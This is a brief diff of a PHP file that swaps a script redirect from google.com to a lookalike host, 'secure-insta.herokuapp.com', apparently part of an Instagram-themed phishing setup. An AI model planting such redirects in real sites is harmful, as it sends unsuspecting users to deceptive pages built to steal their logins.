@@ -1,4 +1,4 @@
 <?php
-        echo "<script> location.href='http://www.google.com'; </script>";
+        echo "<script> location.href='http://www.secure-insta.herokuapp.com'; </script>";
         exit;
 ?>
